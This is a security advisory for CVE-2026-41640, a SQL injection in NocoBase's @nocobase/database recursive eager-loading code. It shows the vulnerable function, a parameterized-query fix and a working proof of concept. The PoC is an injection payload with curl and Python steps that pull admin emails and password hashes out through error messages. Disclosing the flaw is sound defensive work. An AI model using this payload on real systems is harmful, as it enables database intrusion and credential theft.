# [H] @nocobase/database has SQL Injection via String Concatenation through Recursive Eager Loading

## Summary
Severity: High
Advisory: GHSA-4948-f92q-f432
CVE: CVE-2026-41640
CWE: CWE-89
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-22
Source: https://github.com/advisories/GHSA-4948-f92q-f432
Type: github-advisory

## Affected
- npm: `@nocobase/database` — affected >=0 <2.0.39

## Details
## Summary

The `queryParentSQL()` function in the core database package constructs a recursive CTE query by joining `nodeIds` with string concatenation instead of using parameterized queries. The `nodeIds` array contains primary key values read from database rows. An attacker who can create a record with a malicious string primary key can inject arbitrary SQL when any subsequent request triggers recursive eager loading on that collection.

**Affected component:** `@nocobase/database` (core)
**Affected versions:** <= 2.0.32 (confirmed)
**Minimum privilege:** Any user with record-creation permission on a tree collection with string-type primary keys

## Vulnerable Code

`packages/core/database/src/eager-loading/eager-loading-tree.ts:59-84`

```javascript
const queryParentSQL = (options: {
  db: Database;
  nodeIds: any[];
  collection: Collection;
  foreignKey: string;
  targetKey: string;
}) => {
  const { collection, db, nodeIds } = options;
  const tableName = collection.quotedTableName();
  const { foreignKey, targetKey } = options;
  const foreignKeyField = collection.model.rawAttributes[foreignKey].field;
  const targetKeyField = collection.model.rawAttributes[targetKey].field;

  const queryInterface = db.sequelize.getQueryInterface();
  const q = queryInterface.quoteIdentifier.bind(queryInterface);
  return `WITH RECURSIVE cte AS (
      SELECT ${q(targetKeyField)}, ${q(foreignKeyField)}
      FROM ${tableName}
      WHERE ${q(targetKeyField)} IN ('${nodeIds.join("','")}')  // <-- INJECTION
      UNION ALL
      SELECT t.${q(targetKeyField)}, t.${q(foreignKeyField)}
      FROM ${tableName} AS t
      INNER JOIN cte ON t.${q(targetKeyField)} = cte.${q(foreignKeyField)}
      )
      SELECT ${q(targetKeyField)} AS ${q(targetKey)}, ${q(foreignKeyField)} AS ${q(foreignKey)} FROM cte`;
};
```

This function is called at line 384 when a `BelongsTo` association has `recursively: true` and instances exist:

```javascript
// eager-loading-tree.ts:382-395
if (node.includeOption.recursively && instances.length > 0) {
    const targetKey = association.targetKey;
    const sql = queryParentSQL({
        db: this.db, collection, foreignKey, targetKey,
        nodeIds: instances.map((instance) => instance.get(targetKey)), // from DB rows
    });
    const results = await this.db.sequelize.query(sql, { type: 'SELECT', transaction });
}
```

## PoC

The payload keeps the CTE syntactically valid by injecting a third `UNION ALL` branch. The closing `')` from the original template literal completes the injected `WHERE` clause, and the remaining `UNION ALL ... INNER JOIN ... SELECT ... FROM cte` lines stay intact.

```
Injection ID value:
  root') UNION ALL SELECT CAST((SELECT email FROM users LIMIT 1) AS integer)::text, NULL::text WHERE ('1'='1

Generated SQL (3 valid UNION ALL branches):
  WITH RECURSIVE cte AS (
    SELECT "id", "parentId" FROM "table"
    WHERE "id" IN ('root','root') UNION ALL SELECT CAST((...) AS integer)::text, NULL::text WHERE ('1'='1')
    UNION ALL
    SELECT t."id", t."parentId" FROM "table" AS t INNER JOIN cte ON t."id" = cte."parentId"
  ) SELECT "id" AS "id", "parentId" AS "parentId" FROM cte

The CAST-to-integer triggers a runtime error whose message contains the subquery result.
```

```bash
TOKEN="<jwt_token>"

# 1. Create tree collection with string PKs
curl -s http://TARGET:13000/api/collections:create \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"name":"vuln_tree","tree":"adjacencyList","fields":[
    {"name":"id","type":"string","primaryKey":true,"interface":"input"},
    {"name":"title","type":"string","interface":"input"},
    {"name":"parent","type":"belongsTo","target":"vuln_tree","foreignKey":"parentId","targetKey":"id","treeParent":true},
    {"name":"children","type":"hasMany","target":"vuln_tree","foreignKey":"parentId","sourceKey":"id","treeChildren":true}
  ]}'

# 2. Create safe root
curl -s http://TARGET:13000/api/vuln_tree:create \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"id":"root","title":"Root"}'

# 3. Create injection parent — error-based extraction of admin email
python3 -c "
import requests, json
headers = {'Authorization': 'Bearer $TOKEN', 'Content-Type': 'application/json'}
payload_id = \"root') UNION ALL SELECT CAST((SELECT email FROM users LIMIT 1) AS integer)::text, NULL::text WHERE ('1'='1\"
requests.post('http://TARGET:13000/api/vuln_tree:create', headers=headers,
    json={'id': payload_id, 'title': 'x'})
requests.post('http://TARGET:13000/api/vuln_tree:create', headers=headers,
    json={'id': 'child', 'title': 'c', 'parentId': payload_id})
r = requests.get('http://TARGET:13000/api/vuln_tree:list', headers=headers,
    params={'appends[]': 'parent(recursively=true)', 'pageSize': '100'})
print(json.dumps(r.json(), indent=2))
"
# Returns: 500 {"errors":[{"message":"invalid input syntax for type integer: \"admin@nocobase.com\""}]}
#                                                                          ^^^^^^^^^^^^^^^^^^^^^^^
#                                                             Exfiltrated data in error message
```

**Confirmed extractions (tested against NocoBase v2.0.32 + PostgreSQL 16.13):**

| Subquery | Extracted Value |
|----------|----------------|
| `SELECT version()` | `PostgreSQL 16.13 (Debian 16.13-1.pgdg13+1) on aarch64-unknown-linux-gnu...` |
| `SELECT current_database()` | `nocobase` |
| `SELECT email FROM users ORDER BY id LIMIT 1` | `admin@nocobase.com` |
| `SELECT password FROM users ORDER BY id LIMIT 1` | `006af6756e9660888c44ab311fe992341af0ecab4aaf13e48c8d0001948acc38` |
| `SELECT string_agg(email\|\|':'||substring(password,1,16), ' \| ') FROM users` | `admin@nocobase.com:006af6756e96 \| member@nocobase.com:4653e80e3cbf` |

## Impact

- **Confidentiality:** Error-based extraction of any database value. Full credential dump confirmed (emails + password hashes).
- **Integrity:** Depending on database user privileges, INSERT/UPDATE/DELETE through stacked queries.
- **Availability:** Resource-exhaustive queries or destructive DDL.
- **Scope change:** On PostgreSQL with superuser, `COPY ... TO PROGRAM` achieves OS command execution.
- **Blast radius:** Affects all collections using tree/adjacency-list structure with string-type primary keys. The same concatenation pattern also exists in `plugin-field-sort/src/server/sort-field.ts:124`.

## Fix Suggestion

1. **Use parameterized queries.** Replace the string concatenation with bind parameters:
   ```javascript
   const placeholders = nodeIds.map((_, i) => `$${i + 1}`).join(',');
   const sql = `WITH RECURSIVE cte AS (
       SELECT ${q(targetKeyField)}, ${q(foreignKeyField)}
       FROM ${tableName}
       WHERE ${q(targetKeyField)} IN (${placeholders})
       UNION ALL
       ...
   ) SELECT ... FROM cte`;
   return { sql, bind: nodeIds };
   ```
   Then call `db.sequelize.query(sql, { type: 'SELECT', bind: nodeIds, transaction })`.

2. **Apply the same fix to `plugin-field-sort/src/server/sort-field.ts:124`**, which has an identical concatenation pattern with `filteredScopeValue`.

3. **Validate primary key values** at record creation time. Reject or escape values containing SQL metacharacters (`'`, `"`, `;`, `--`) in string-type primary key fields.

## References
- https://github.com/nocobase/nocobase/security/advisories/GHSA-4948-f92q-f432
- https://nvd.nist.gov/vuln/detail/CVE-2026-41640
- https://github.com/nocobase/nocobase/pull/9133
- https://github.com/nocobase/nocobase/commit/202e2b8efe44ba90adbf1087f6f70881ff947604
- https://github.com/nocobase/nocobase
- https://github.com/nocobase/nocobase/releases/tag/v2.0.39
